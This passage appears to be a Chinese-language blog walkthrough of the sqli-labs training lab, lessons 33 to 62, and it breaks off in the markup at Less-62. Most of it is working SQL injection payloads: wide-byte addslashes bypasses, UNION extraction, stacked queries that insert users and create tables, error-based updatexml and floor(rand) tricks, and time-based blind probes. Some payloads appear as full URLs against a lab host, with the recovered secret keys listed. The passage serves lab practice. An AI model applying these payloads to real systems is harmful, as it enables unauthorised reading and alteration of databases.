
<h2 id="Less-33-bypass-Addslashes"><a href="#Less-33-bypass-Addslashes" class="headerlink" title="Less-33 bypass Addslashes()"></a>Less-33 bypass Addslashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">这里主要是如何绕过addslashes()这个函数</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line"></span><br><span class="line">预定义字符是：</span><br><span class="line"></span><br><span class="line">    单引号（&apos;）</span><br><span class="line">    双引号（&quot;）</span><br><span class="line">    反斜杠（\）</span><br><span class="line">    NULL</span><br><span class="line"></span><br><span class="line">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br><span class="line"></span><br><span class="line">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">这里和32 差别不大 一个是自定义添加，另一个是使用函数添加</span><br><span class="line">0%df&apos;  union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-34-bypass-Addslashes"><a href="#Less-34-bypass-Addslashes" class="headerlink" title="Less-34 bypass Addslashes()"></a>Less-34 bypass Addslashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">和上一关差别不大，使用post请求</span><br><span class="line">一样的宽字节注入，并且在uname和passwd处都存在注入</span><br><span class="line">uname=0%df&apos;  union select 1,database() --+&amp;passwd=0&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-35-GET-Bypass添加斜杠-我们不需要-整数"><a href="#Less-35-GET-Bypass添加斜杠-我们不需要-整数" class="headerlink" title="Less-35 GET-Bypass添加斜杠(我们不需要)整数"></a>Less-35 GET-Bypass添加斜杠(我们不需要)整数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里输入的整数 直接--+ 就可以绕过了</span><br><span class="line">0 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-36-GET-Bypass-MySQLreal-escape-string"><a href="#Less-36-GET-Bypass-MySQLreal-escape-string" class="headerlink" title="Less-36 GET-Bypass MySQLreal escape_string"></a>Less-36 GET-Bypass MySQLreal escape_string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">先来看看这个函数</span><br><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &apos;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line">而这个函数可以通过以下语句绕过</span><br><span class="line">aaa&apos; OR 1=1 --</span><br><span class="line"></span><br><span class="line">0%df&apos; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-37-POST-Bypass-MySQLreal-escape-string"><a href="#Less-37-POST-Bypass-MySQLreal-escape-string" class="headerlink" title="Less-37 POST-Bypass MySQLreal escape_string"></a>Less-37 POST-Bypass MySQLreal escape_string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">到了后面，主要讲思路，语句基本都会了</span><br><span class="line">这里是post方式，我们抓包 添加语句到uname或者passwd中，同样是添加&apos;%df报错，查询 --+做注释</span><br><span class="line"></span><br><span class="line">uname=0%df&apos; union select 1,database() --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">成功绕过</span><br></pre></td></tr></table></figure>

<h2 id="Less-38-层次化查询"><a href="#Less-38-层次化查询" class="headerlink" title="Less-38 层次化查询"></a>Less-38 层次化查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以直接正常注入</span><br><span class="line">主要看下这个函数</span><br><span class="line">mysqli_more_results() 检查一个多重查询语句中是否有更多结果</span><br></pre></td></tr></table></figure>

<h2 id="Less-38-层次化查询-1"><a href="#Less-38-层次化查询-1" class="headerlink" title="Less-38 层次化查询"></a>Less-38 层次化查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">也叫堆叠注入</span><br><span class="line">简单来说 就是通过将多条语句通过；隔开写在一起构成多语句，由于未对参数进行处理导致多条语句正常执行</span><br><span class="line">堆叠查询受限于api或者数据库引擎不支持的限制，权限不足也会限制语句执行</span><br><span class="line"></span><br><span class="line">1&apos;;insert into users(id,username,password) values (&apos;16&apos;,&apos;a&apos;,&apos;a&apos;)--</span><br></pre></td></tr></table></figure>

<h2 id="Less-39-GET-Stacked-Query-Injection-Intiger-based"><a href="#Less-39-GET-Stacked-Query-Injection-Intiger-based" class="headerlink" title="Less-39 GET -  Stacked Query Injection - Intiger based"></a>Less-39 GET -  Stacked Query Injection - Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句都一样，重点是找到闭合的方式</span><br><span class="line">1;insert into users(id,username,password) values (16,&apos;a&apos;,&apos;a&apos;)--</span><br></pre></td></tr></table></figure>

<h2 id="Less-40-GET-BLIND-based-String-stacked"><a href="#Less-40-GET-BLIND-based-String-stacked" class="headerlink" title="Less-40 GET-BLIND - based - String - stacked"></a>Less-40 GET-BLIND - based - String - stacked</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;); insert into users(id,username,password) values (&apos;17&apos;,&apos;a&apos;,&apos;a&apos;)--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-41-GET-BLIND-based-Intiger-Stacked"><a href="#Less-41-GET-BLIND-based-Intiger-Stacked" class="headerlink" title="Less-41 GET - BLIND based - Intiger - Stacked"></a>Less-41 GET - BLIND based - Intiger - Stacked</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; insert into users(id,username,password) values(18,&apos;b&apos;,&apos;b&apos;) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-42-POST-Stacked-Query-error-based"><a href="#Less-42-POST-Stacked-Query-error-based" class="headerlink" title="Less-42 POST - Stacked Query error based"></a>Less-42 POST - Stacked Query error based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">经过验证，在password处语句报错，所以我们需要从passowrd入手</span><br><span class="line"></span><br><span class="line">0&apos;;create table aaa like users #</span><br></pre></td></tr></table></figure>

<h2 id="Less-43-POST-Stacked-Query-error-based-with-twist"><a href="#Less-43-POST-Stacked-Query-error-based-with-twist" class="headerlink" title="Less-43 POST- Stacked Query error based with twist"></a>Less-43 POST- Stacked Query error based with twist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">和 42 类似 同样password 未过滤</span><br><span class="line"></span><br><span class="line">login_user=1&amp;login_password=a&apos;);create table less43 like users#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<h2 id="Less-44-POST-Error-based-String-Stacked-Blind"><a href="#Less-44-POST-Error-based-String-Stacked-Blind" class="headerlink" title="Less-44 POST - Error based - String - Stacked -Blind"></a>Less-44 POST - Error based - String - Stacked -Blind</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a&apos;;insert into users(id,username,password) values(19,&apos;a&apos;,&apos;a&apos;) --+&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<h2 id="Less-45-POST-Error-based-String-Stacked-Blind"><a href="#Less-45-POST-Error-based-String-Stacked-Blind" class="headerlink" title="Less-45 POST - Error based - String - Stacked - Blind"></a>Less-45 POST - Error based - String - Stacked - Blind</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a&apos;); insert into users(id,username,password) values(20,&apos;&apos;c&apos;,&apos;c&apos;) --+&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<h2 id="Less-46-ORDER-BY-Error-Numeric"><a href="#Less-46-ORDER-BY-Error-Numeric" class="headerlink" title="Less-46 ORDER BY-Error-Numeric"></a>Less-46 ORDER BY-Error-Numeric</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">终于迎来了一个过渡</span><br><span class="line">这次的注入是通过order by 来进行的</span><br><span class="line">通过sort 查询 发现当输入4的时候报错，而报错提示与order by 提示相同，猜想可能是将输入的值插入order by里进行的</span><br><span class="line">通过updatexml 报错注入</span><br><span class="line">sort=4 and updatexml(1,concat(0x7e,(select database()),0x7e),1) %23</span><br></pre></td></tr></table></figure>

<h2 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 ORDER BY Clause-Error-Single quote"></a>Less-47 ORDER BY Clause-Error-Single quote</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">和46有少许区别，做到这里基本套路应该都懂了，从不需要单引号，双引号之类的报错，到盲注，难度都是一步一步深入</span><br><span class="line">sort=4&apos; and (select count(*)  from information_schema.columns group by concat(0x7e,(select database()),0x7e,floor(rand(0)*2)))  --+</span><br><span class="line">注意 and后面的语句要使用（）括起来</span><br><span class="line">基于 procedure analyse 注入</span><br><span class="line">sort=1&apos;procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 ORDER BY Clause Blind based"></a>Less-48 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这一题 需要使用盲注解决</span><br><span class="line">通过substr获取所要查询的信息的位数</span><br><span class="line">然后使用ascii去解析成ascii编码</span><br><span class="line">之后通过if判断是否相等 去获取值</span><br><span class="line">之后构成 if(ascii(substr(datbase(),1,1)))</span><br><span class="line"></span><br><span class="line">或者使用rand(ascii(left(database,1))=115) 同样获取相同的效果</span><br></pre></td></tr></table></figure>

<h2 id="Less-49-ORDER-BY-Clause-Blind-based"><a href="#Less-49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-49 ORDER BY Clause Blind based"></a>Less-49 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">同样是盲注，和48类似</span><br><span class="line">这一题使用延时盲注解决</span><br><span class="line">获取长度</span><br><span class="line">1 and if(length(database())=8,sleep(5),0)--+</span><br><span class="line">获取值</span><br><span class="line">1 and If(ascii(substr(database(),1,1))=114,0,sleep (5))--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-50-ORDER-BY-Clause-Blind-based"><a href="#Less-50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-50 ORDER BY Clause Blind based"></a>Less-50 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检测 返回只有正确或者错误，属于盲注</span><br><span class="line"></span><br><span class="line">通过报错注入 也能获取</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 ORDER BY Clause Blind based"></a>Less-51 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort=1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 ORDER BY Clause Blind based"></a>Less-52 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试发现均没有显错 只能盲注了</span><br><span class="line">1 and if(length(database())=8,sleep(5),0) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less - 53 ORDER BY Clause Blind based"></a>Less - 53 ORDER BY Clause Blind based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过测试发现回显只有正确和错误，所以这道题做法基本就是盲注了，</span><br><span class="line">4&apos; and if(length(database()) = 8 ,0,sleep(6)) --+</span><br><span class="line">1&apos; and (length(database())) = 8 and if(1=1, sleep(1), null) and &apos;1&apos;=&apos;1</span><br><span class="line">1&apos; and (ascii(substr((select database()) ,1,1))) = 114 and if(1=1, sleep(1), null) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>又要进入一个新的过渡了</p>
<h2 id="Less-54-GET-challenge-Union-10-queries-allowed-Variation-1"><a href="#Less-54-GET-challenge-Union-10-queries-allowed-Variation-1" class="headerlink" title="Less-54 GET-challenge-Union-10 queries allowed-Variation 1"></a>Less-54 GET-challenge-Union-10 queries allowed-Variation 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">挑战 ，允许查询10次，先不急去查看，观察一下需要输入的内容</span><br><span class="line">所以，我们只有10次机会，</span><br><span class="line">一般获取一个表正常需要获取数据库，到表，到列，再到数据，所以最少需要4步，而这里我们需要用6步猜测出来注入</span><br><span class="line">回忆一下前面的注入， get类型的包含但不限于单引号，双引号，bool，堆叠，延时，报错，字符型和数字型，双注。</span><br><span class="line"></span><br><span class="line">第一道题 采用最简单的&apos;注入</span><br><span class="line">http://192.168.64.135/Less-54/?id=1%27%20order%20by%203%20%23 // True</span><br><span class="line">http://192.168.64.135/Less-54/?id=1%27%20order%20by%204%20%23 // false</span><br><span class="line">http://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,database()%20%23 // True challenges</span><br><span class="line">http://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20%23 // True 8T3YRE3TXR</span><br><span class="line">http://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%278T3YRE3TXR%27%20%23// true secret_4XCQ</span><br><span class="line">http://192.168.64.135/Less-54/?id=0%27%20union%20select%201,2,group_concat(secret_4XCQ)%20from%208T3YRE3TXR%20%23 // True aefBbyoeStF7Edc3FZa4G5C4</span><br></pre></td></tr></table></figure>

<h2 id="Less-55-GET-challenge-Union-14-queries-allowed-Variation-2"><a href="#Less-55-GET-challenge-Union-14-queries-allowed-Variation-2" class="headerlink" title="Less-55 GET-challenge-Union-14 queries allowed-Variation 2"></a>Less-55 GET-challenge-Union-14 queries allowed-Variation 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">线索： 告诉了测试次数14次， union测试 数据库challenges</span><br><span class="line">第一次挑战 失败 </span><br><span class="line">&apos; &quot; &apos;) &quot;) 均没有回显 初次猜测报错注入或者双注</span><br><span class="line">第二次尝试</span><br><span class="line">) 闭合</span><br><span class="line">获取表</span><br><span class="line">=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;challenges&apos; %23 // True UBU4QNRHHP</span><br><span class="line">获取列</span><br><span class="line">id=0) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&apos;challenges&apos; and table_name=&apos;UBU4QNRHHP&apos; %23 //true</span><br><span class="line">// secret_6H3B</span><br><span class="line">获取key</span><br><span class="line">0) union select 1,2,group_concat(secret_6H3B) from UBU4QNRHHP %23</span><br><span class="line">mLjAsOZnSEbQqIMybw1AnUYH</span><br></pre></td></tr></table></figure>

<h2 id="Less-56-GET-challenge-Union-14-queries-allowed-Variation-3"><a href="#Less-56-GET-challenge-Union-14-queries-allowed-Variation-3" class="headerlink" title="Less-56 GET-challenge-Union-14 queries allowed-Variation 3"></a>Less-56 GET-challenge-Union-14 queries allowed-Variation 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">这次老老实实绕过</span><br><span class="line">id=1&apos; %23 // False</span><br><span class="line">id=1&quot; %23 // True 但是注入 union报错</span><br><span class="line">添加为</span><br><span class="line">id=1&apos; union select 1,2,3 %23 // False</span><br><span class="line">id=1&quot; union select 1,2,3 %23 //False</span><br><span class="line">id=1&apos;) union select 1,2,3 %23 </span><br><span class="line">获取表</span><br><span class="line">0%27)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 </span><br><span class="line">KOUNR4QC6G</span><br><span class="line">获取列</span><br><span class="line">0&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;KOUNR4QC6G&apos;%23</span><br><span class="line">secret_3EVD</span><br><span class="line">获取key</span><br><span class="line">0&apos;) union select 1,2,group_concat(secret_3EVD) from KOUNR4QC6G %23</span><br><span class="line">KcU87wBerjRPTHsvWBL6Zpx1</span><br></pre></td></tr></table></figure>

<h2 id="Less-57-GET-challenge-Union-14-queries-allowed-Variation-4"><a href="#Less-57-GET-challenge-Union-14-queries-allowed-Variation-4" class="headerlink" title="Less-57 GET-challenge-Union-14 queries allowed-Variation 4"></a>Less-57 GET-challenge-Union-14 queries allowed-Variation 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">做法 和之前一样</span><br><span class="line">0&quot; union select 1,2,3 %23</span><br><span class="line">通过改变0之后的值达到闭合的目的</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">0&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;challenges&apos;%23</span><br><span class="line">VAFBXAV18O</span><br><span class="line">获取列</span><br><span class="line">0&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&apos;challenges&apos; and table_name=&apos;VAFBXAV18O&apos;%23</span><br><span class="line">secret_G8PM</span><br><span class="line">获取key</span><br><span class="line">0&quot; union select 1,2,group_concat(secret_G8PM) from VAFBXAV18O %23</span><br><span class="line">dRwHUUQ2TXSGUZ556g7FikFJ</span><br></pre></td></tr></table></figure>

<h2 id="Less-58-GET-challenge-Double-Query-5-queries-allowed-Variation-1"><a href="#Less-58-GET-challenge-Double-Query-5-queries-allowed-Variation-1" class="headerlink" title="Less-58 GET-challenge-Double Query-5 queries allowed-Variation 1"></a>Less-58 GET-challenge-Double Query-5 queries allowed-Variation 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">这道题 不看题目可能需要测好久</span><br><span class="line">这次使用双注来报错查询</span><br><span class="line">http://192.168.64.135/Less-58/?id=1%27and%20%271%27=%271 // True 绕过</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">1&apos;and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">5H512U9U27</span><br><span class="line">获取列</span><br><span class="line">1&apos;and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select column_name from information_schema.columns where table_schema=database() and table_name=&apos;5H512U9U27&apos; limit 2,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">secret_DD13</span><br><span class="line">获取key</span><br><span class="line">1&apos;and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select secret_BJYY from 9JMRBSMHB3 limit 0,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">fJw5d5MfwbirBtiV6ajyMVYL</span><br></pre></td></tr></table></figure>

<h2 id="Less-59-GET-challenge-Double-Query-5-queries-allowed-Variation-2"><a href="#Less-59-GET-challenge-Double-Query-5-queries-allowed-Variation-2" class="headerlink" title="Less-59 GET-challenge-Double Query-5 queries allowed-Variation 2"></a>Less-59 GET-challenge-Double Query-5 queries allowed-Variation 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">先测试类型</span><br><span class="line">有报错，可以注入</span><br><span class="line">这次不需要过滤 </span><br><span class="line">获取表</span><br><span class="line">1 and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">N6JFY84247</span><br><span class="line">获取列</span><br><span class="line">1 and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select column_name from information_schema.columns where table_schema=database() and table_name=&apos;N6JFY84247&apos; limit 2,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">secret_FWQ3</span><br><span class="line">获取key</span><br><span class="line">1 and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select secret_FWQ3 from N6JFY84247 limit 0,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">VlWMK389WVuIephCe46vDls5</span><br></pre></td></tr></table></figure>

<h2 id="Less-60-GET-challenge-Double-Query-5-queries-allowed-Variation-3"><a href="#Less-60-GET-challenge-Double-Query-5-queries-allowed-Variation-3" class="headerlink" title="Less-60 GET-challenge-Double Query-5 queries allowed-Variation 3"></a>Less-60 GET-challenge-Double Query-5 queries allowed-Variation 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">测试 单引号 双引号 ) &apos;) &quot;) 发现&quot;) 闭合 绕过</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">http://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23</span><br><span class="line">5H36JXB2F0</span><br><span class="line">获取 列</span><br><span class="line">http://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%275H36JXB2F0%27%20limit%202,1),%27~%27,floor(rand(0)*2)))%20%23</span><br><span class="line">secret_NFL6</span><br><span class="line">获取key</span><br><span class="line">http://192.168.64.135/Less-60/?id=1%22)%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20secret_NFL6%20from%205H36JXB2F0%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23</span><br><span class="line">49DYkkaArpuMaYb5ITI6NYlP</span><br></pre></td></tr></table></figure>

<h2 id="Less-61-GET-challenge-Double-Query-5-queries-allowed-Variation-4"><a href="#Less-61-GET-challenge-Double-Query-5-queries-allowed-Variation-4" class="headerlink" title="Less-61 GET-challenge-Double Query-5 queries allowed-Variation 4"></a>Less-61 GET-challenge-Double Query-5 queries allowed-Variation 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过1&apos; 判断闭合</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">1%</span><br><span class="line">27))%20and%20(select%20count(*)%20from%20information_schema.tables%20group%20by%20concat(%27~%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),%27~%27,floor(rand(0)*2)))%20%23</span><br><span class="line">EKP9EVPEDH</span><br><span class="line">获取列</span><br><span class="line">1&apos;)) and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select column_name from information_schema.columns where table_schema=database()%20 and table_name=&apos;EKP9EVPEDH&apos; limit 2,1),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">secret_DI64</span><br><span class="line">获取key</span><br><span class="line">1&apos;)) and (select count(*) from information_schema.tables group by concat(&apos;~&apos;,(select secret_DI64 from EKP9EVPEDH ),&apos;~&apos;,floor(rand(0)*2))) %23</span><br><span class="line">8r5XPen1KywllEINiQfAQnlq</span><br></pre></td></tr></table></figure>

<h2 id="Less-62-GET-challenge-Blind-130-queries-allowed-variation-1"><a href="#Less-62-GET-challenge-Blind-130-queries-allowed-variation-1" class="headerlink" title="Less-62 GET-challenge-Blind- 130 queries allowed -variation 1"></a>Less-62 GET-challenge-Blind- 130 queries allowed -variation 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 